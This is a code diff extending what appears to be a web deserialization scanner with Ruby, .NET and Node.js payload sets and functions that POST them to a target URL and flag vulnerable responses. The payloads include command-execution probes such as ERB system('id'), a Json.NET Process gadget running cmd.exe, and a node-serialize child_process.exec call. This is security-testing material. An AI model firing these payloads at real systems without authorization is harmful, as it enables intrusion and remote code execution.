@@ -67,6 +67,12 @@ _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
 
     "bypass": ["url_encode", "base64_wrap", "double_encode", "gzip_compress", "nested_serial"],
 
+    "ruby": ["ruby_marshal", "ruby_yaml", "ruby_erb", "ruby_pysch", "ruby_symbol"],
+
+    "dotnet": ["dotnet_binary", "dotnet_viewstate", "dotnet_jsonnet", "dotnet_soap", "dotnet_objstate"],
+
+    "nodejs": ["node_serialize", "node_child", "node_fs", "node_eval", "node_process"],
+
 }
 
 
@@ -350,6 +356,173 @@ _BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
 ]
 
 
+_RUBY_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+
+    (
+
+        "ruby_marshal",
+
+        "\\x04\\x08I\\x40\\x06\\x01\\x06\\x06T\\x30\\x06\\x06n\\x06\\x10admin",
+
+        ["\\x04\\x08", "Marshal", "ruby", "serialize", "object"],
+
+    ),
+
+    (
+
+        "ruby_yaml",
+
+        "--- !ruby/object:Gem::Installer\\ni: x",
+
+        ["!ruby/object", "Gem::Installer", "yaml", "deserialize", "ruby"],
+
+    ),
+
+    (
+
+        "ruby_erb",
+
+        "<%= system('id') %>",
+
+        ["system", "erb", "ruby", "eval", "execute"],
+
+    ),
+
+    (
+
+        "ruby_pysch",
+
+        "--- !ruby/object:Gem::Requirement\\nrequirements:\\n  !ruby/object:Gem::StubSpecification\\n    loaded_from: |2\\n      \\x00\\x00\\x00\\x00admin",
+
+        ["!ruby/object", "Psych", "yaml", "deserialize", "Gem"],
+
+    ),
+
+    (
+
+        "ruby_symbol",
+
+        '{"json_class":"Symbol","s":"admin"}',
+
+        ["Symbol", "json_class", "ruby", "serialize", "admin"],
+
+    ),
+
+]
+
+
+
+_DOTNET_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+
+    (
+
+        "dotnet_binary",
+
+        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uV29ya3Nsb3cuV29ya2Jvb2s=",
+
+        ["AAEAAAD", "BinaryFormatter", "System", "serialize", "dotnet"],
+
+    ),
+
+    (
+
+        "dotnet_viewstate",
+
+        "dDwtMTE3MTQ3NTQ0OTt0PDtsPGk8ZDw7bDxpPDA+O2k8Mj47aTwv...==",
+
+        ["viewstate", "ASP.NET", "deserialize", "f:", "t:"],
+
+    ),
+
+    (
+
+        "dotnet_jsonnet",
+
+        '{"$type":"System.Diagnostics.Process, System","FileName":"cmd.exe","Arguments":"/c id"}',
+
+        ["$type", "TypeNameHandling", "json", "deserialize", "System"],
+
+    ),
+
+    (
+
+        "dotnet_soap",
+
+        '<SOAP-ENV:Body><m:Ping xmlns:m="http://tempuri.org/"><f xsi:type="xsd:string">admin</f></m:Ping></SOAP-ENV:Body>',
+
+        ["SOAP", "deserialize", "Body", "type", "dotnet"],
+
+    ),
+
+    (
+
+        "dotnet_objstate",
+
+        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRnJhbWV3b3JrLkFzcGVtYmxpZXM=",
+
+        ["AAEAAAD", "ObjectStateFormatter", "System", "serialize", "frame"],
+
+    ),
+
+]
+
+
+
+_NODEJS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+
+    (
+
+        "node_serialize",
+
+        '{"rce":"_$$ND_FUNC$$_function(){require("child_process").exec("id")}()"}',
+
+        ["_$$ND_FUNC$$", "node-serialize", "rce", "function", "require"],
+
+    ),
+
+    (
+
+        "node_child",
+
+        '{"__proto__":{"child_process":true}}',
+
+        ["__proto__", "child_process", "node", "pollute", "rce"],
+
+    ),
+
+    (
+
+        "node_fs",
+
+        '{"__proto__":{"fs":true}}',
+
+        ["__proto__", "fs", "node", "readFile", "file"],
+
+    ),
+
+    (
+
+        "node_eval",
+
+        '{"__proto__":{"eval":true}}',
+
+        ["__proto__", "eval", "node", "execute", "code"],
+
+    ),
+
+    (
+
+        "node_process",
+
+        '{"__proto__":{"process":{"env":true}}}',
+
+        ["__proto__", "process", "env", "node", "leak"],
+
+    ),
+
+]
+
+
 
 _SSI_PARAMS_DEFAULT: list[str] = [
 
@@ -442,6 +615,48 @@ def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:
 
 
 _BYPASS_PAYLOADS = _load_bypass_payloads()
+
+
+
+def _load_ruby_payloads() -> list[tuple[str, str, list[str]]]:
+
+    from mytools.data import load_payloads
+
+    data = load_payloads("web", "deserialinject", default={"ruby_payloads": [list(t) for t in _RUBY_PAYLOADS_DEFAULT]})
+
+    return [tuple(x) for x in data.get("ruby_payloads", [list(t) for t in _RUBY_PAYLOADS_DEFAULT])]
+
+
+
+_RUBY_PAYLOADS = _load_ruby_payloads()
+
+
+
+def _load_dotnet_payloads() -> list[tuple[str, str, list[str]]]:
+
+    from mytools.data import load_payloads
+
+    data = load_payloads("web", "deserialinject", default={"dotnet_payloads": [list(t) for t in _DOTNET_PAYLOADS_DEFAULT]})
+
+    return [tuple(x) for x in data.get("dotnet_payloads", [list(t) for t in _DOTNET_PAYLOADS_DEFAULT])]
+
+
+
+_DOTNET_PAYLOADS = _load_dotnet_payloads()
+
+
+
+def _load_nodejs_payloads() -> list[tuple[str, str, list[str]]]:
+
+    from mytools.data import load_payloads
+
+    data = load_payloads("web", "deserialinject", default={"nodejs_payloads": [list(t) for t in _NODEJS_PAYLOADS_DEFAULT]})
+
+    return [tuple(x) for x in data.get("nodejs_payloads", [list(t) for t in _NODEJS_PAYLOADS_DEFAULT])]
+
+
+
+_NODEJS_PAYLOADS = _load_nodejs_payloads()
 
 
 
@@ -1098,6 +1313,323 @@ async def _test_bypass(
 
 
 
+async def _test_ruby(
+
+    client: httpx.AsyncClient,
+
+    url: str,
+
+    baseline: tuple[int, int, bytes],
+
+) -> list[DeserialAttempt]:
+
+    """Testa payloads de deserialization Ruby."""
+
+    b_status, b_size, _ = baseline
+
+    results: list[DeserialAttempt] = []
+
+
+
+    for technique, payload, indicators in _RUBY_PAYLOADS:
+
+        for param in _SSI_PARAMS[:3]:
+
+            try:
+
+                json_data = {param: payload}
+
+                resp = await client.post(url, json=json_data, follow_redirects=True)
+
+                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="ruby",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_json",
+
+                    status_baseline=b_status,
+
+                    status_test=resp.status_code,
+
+                    size_baseline=b_size,
+
+                    size_test=len(resp.content),
+
+                    status_changed=resp.status_code != b_status,
+
+                    size_changed=len(resp.content) != b_size,
+
+                    vulnerable=vulnerable,
+
+                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
+
+                    error="",
+
+                    exploit="marshal_payload" if vulnerable else "",
+
+                    tool="marshal",
+
+                ))
+
+            except httpx.RequestError as e:
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="ruby",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_json",
+
+                    status_baseline=b_status,
+
+                    status_test=0,
+
+                    size_baseline=b_size,
+
+                    size_test=0,
+
+                    status_changed=False,
+
+                    size_changed=False,
+
+                    vulnerable=False,
+
+                    details="",
+
+                    error=str(e)[:100],
+
+                ))
+
+
+
+    return results
+
+
+
+
+async def _test_dotnet(
+
+    client: httpx.AsyncClient,
+
+    url: str,
+
+    baseline: tuple[int, int, bytes],
+
+) -> list[DeserialAttempt]:
+
+    """Testa payloads de deserialization .NET."""
+
+    b_status, b_size, _ = baseline
+
+    results: list[DeserialAttempt] = []
+
+
+
+    for technique, payload, indicators in _DOTNET_PAYLOADS:
+
+        for param in _SSI_PARAMS[:3]:
+
+            try:
+
+                resp = await client.post(url, content=payload.encode() if isinstance(payload, str) else payload, follow_redirects=True)
+
+                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="dotnet",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_raw",
+
+                    status_baseline=b_status,
+
+                    status_test=resp.status_code,
+
+                    size_baseline=b_size,
+
+                    size_test=len(resp.content),
+
+                    status_changed=resp.status_code != b_status,
+
+                    size_changed=len(resp.content) != b_size,
+
+                    vulnerable=vulnerable,
+
+                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
+
+                    error="",
+
+                    exploit="binary_formatter_payload" if vulnerable else "",
+
+                    tool="ysoserial.net",
+
+                ))
+
+            except httpx.RequestError as e:
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="dotnet",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_raw",
+
+                    status_baseline=b_status,
+
+                    status_test=0,
+
+                    size_baseline=b_size,
+
+                    size_test=0,
+
+                    status_changed=False,
+
+                    size_changed=False,
+
+                    vulnerable=False,
+
+                    details="",
+
+                    error=str(e)[:100],
+
+                ))
+
+
+
+    return results
+
+
+
+
+async def _test_nodejs(
+
+    client: httpx.AsyncClient,
+
+    url: str,
+
+    baseline: tuple[int, int, bytes],
+
+) -> list[DeserialAttempt]:
+
+    """Testa payloads de deserialization Node.js."""
+
+    b_status, b_size, _ = baseline
+
+    results: list[DeserialAttempt] = []
+
+
+
+    for technique, payload, indicators in _NODEJS_PAYLOADS:
+
+        for param in _SSI_PARAMS[:3]:
+
+            try:
+
+                json_data = {param: payload}
+
+                resp = await client.post(url, json=json_data, follow_redirects=True)
+
+                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="nodejs",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_json",
+
+                    status_baseline=b_status,
+
+                    status_test=resp.status_code,
+
+                    size_baseline=b_size,
+
+                    size_test=len(resp.content),
+
+                    status_changed=resp.status_code != b_status,
+
+                    size_changed=len(resp.content) != b_size,
+
+                    vulnerable=vulnerable,
+
+                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
+
+                    error="",
+
+                    exploit="node_serialize_rce" if vulnerable else "",
+
+                    tool="node-serialize",
+
+                ))
+
+            except httpx.RequestError as e:
+
+                results.append(DeserialAttempt(
+
+                    technique=technique,
+
+                    category="nodejs",
+
+                    payload=payload,
+
+                    param=param,
+
+                    method="post_json",
+
+                    status_baseline=b_status,
+
+                    status_test=0,
+
+                    size_baseline=b_size,
+
+                    size_test=0,
+
+                    status_changed=False,
+
+                    size_changed=False,
+
+                    vulnerable=False,
+
+                    details="",
+
+                    error=str(e)[:100],
+
+                ))
+
+
+
+    return results
+
+
 
 
 def print_results(result: DeserialResult) -> None:
@@ -1217,6 +1749,18 @@ async def run_scan(
             elif cat == "bypass":
 
                 attempts = await _test_bypass(client, target, (b_status, b_size, b""))
+
+            elif cat == "ruby":
+
+                attempts = await _test_ruby(client, target, (b_status, b_size, b""))
+
+            elif cat == "dotnet":
+
+                attempts = await _test_dotnet(client, target, (b_status, b_size, b""))
+
+            elif cat == "nodejs":
+
+                attempts = await _test_nodejs(client, target, (b_status, b_size, b""))
 
             else:
 
@@ -1404,7 +1948,10 @@ def main() -> int:
 
             "  https://target.com -c python\n"
 
-            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
+            "  https://target.com -c bypass --proxy http://127.0.0.1:8080\n"
+            "  https://target.com -c ruby\n"
+            "  https://target.com -c dotnet\n"
+            "  https://target.com -c nodejs"
 
         ),
 
